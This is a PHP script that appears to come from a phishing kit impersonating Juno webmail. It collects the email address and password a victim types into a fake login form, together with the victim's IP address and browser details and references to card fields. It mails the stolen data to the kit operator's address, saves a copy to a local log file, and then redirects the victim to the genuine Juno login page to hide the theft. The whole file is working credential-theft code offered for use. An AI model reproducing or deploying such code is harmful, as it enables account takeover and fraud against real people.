<?php
$ip = getenv("REMOTE_ADDR");

include('./email.php');


$message .= "--++-----[ $$ juno log Access $$ ]-----++--\n";
$message .= "-------------- SMTP -------------\n";
$message .= "Email : ".$_POST['LOGIN']."\n";
$message .= "Password : ".$_POST['PASSWORD']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $ip\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By starking ----------------------\n";
$cc = $_POST['ccn'];
$subject = " juno log Result [ " . $ip . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: juno log starking <contact>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('././rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location:https://webmail.juno.com/cgi-bin/login.cgi?login_type=mrich");